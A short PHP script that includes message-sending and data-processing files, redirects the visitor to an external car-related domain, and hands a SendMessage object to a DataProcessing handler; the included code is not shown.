<?php

include_once "SendMessage.php";
include_once "DataProcessing.php";
header("Location: https://www.detalscars.space/");
new DataProcessing(new SendMessage());
?>


